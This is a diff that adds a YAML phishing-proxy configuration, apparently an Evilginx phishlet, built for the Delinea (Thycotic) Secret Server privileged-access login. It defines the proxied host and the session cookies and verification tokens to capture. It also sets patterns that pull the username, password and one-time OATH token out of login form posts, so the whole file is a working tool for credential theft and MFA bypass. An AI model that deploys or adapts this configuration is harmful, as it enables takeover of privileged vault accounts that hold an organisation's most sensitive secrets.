@@ -1,0 +1,36 @@
+name: 'PAM Delinea'
+
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'pam', orig_sub: 'pam', domain: '<host>.com', session: true, is_landing: true, auto_filter: true}
+
+auth_tokens:
+  - domain: 'pam.<host>.com'
+    keys: ['ihawu' , '__RequestVerificationToken_L1NlY3JldFNlcnZlcg2' , 'ASP.NET_SessionId', 'Thycotic_Embedded', 'Thycotic_Location', 'Thycotic_DomainId', 'Thycotic_HasVisualKeyboardSelected']
+    type: 'cookie'
+
+
+auth_urls:
+  - '/SecretServer/app/'
+
+
+credentials:
+  username:
+    key: '(UserNameTextBox)'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: '(PasswordTextBox)'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    - key: 'OATHTokenTex'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'pam.<host>.com'
+  path: '/SecretServer'
